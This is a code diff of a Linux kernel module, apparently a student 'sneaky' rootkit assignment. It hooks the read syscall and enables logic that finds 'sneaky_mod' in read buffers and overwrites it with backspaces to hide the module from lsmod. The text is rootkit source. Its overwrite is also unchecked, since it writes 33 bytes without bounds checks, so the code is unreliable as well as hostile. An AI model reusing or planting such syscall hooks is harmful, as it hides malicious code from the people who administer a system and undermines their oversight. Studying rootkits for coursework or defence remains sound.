@@ -83,12 +83,21 @@ asmlinkage int (*read_original)(int fd, void *buf, size_t count);
 //Define our new sneaky version of the 'read' syscall
 asmlinkage int sneaky_read(int fd, void *buf, size_t count)
 {
-
-  ssize_t ret = read_original(fd, buf, count);
-
   /*
+  char* mem = kmalloc(count, GFP_KERNEL);
+  if (mem == NULL) {
+    return -ENOMEM;
+  }
+  //Kernel sys call
+  mm_segment_t userspace = get_fs();
+  set_fs(KERNEL_DS);
+  long numbytes= read_original(fd, mem, count);
+  set_fs(userspace);
+  */
+  
+  ssize_t ret = read_original(fd, buf, count);
   //FIND SNEAKY MOD IN LSMOD
-  const char * needle = "sneaky_mod";
+  const char * needle = "sneaky_mod          ";
   const char * haystack = (const char *) buf;
   int i, j;
   //checking int
@@ -102,12 +111,11 @@ asmlinkage int sneaky_read(int fd, void *buf, size_t count)
   }
   char * locale = strstr(haystack, needle);
   if (locale != NULL) {
-    for (j = 0; j < 4; j++) {
-      *(locale) = '0';
+    for (j = 0; j < 33; j++) {
+      *(locale) = '\b';
       locale++;
     }
   }
-  */
   return ret;
 }
 
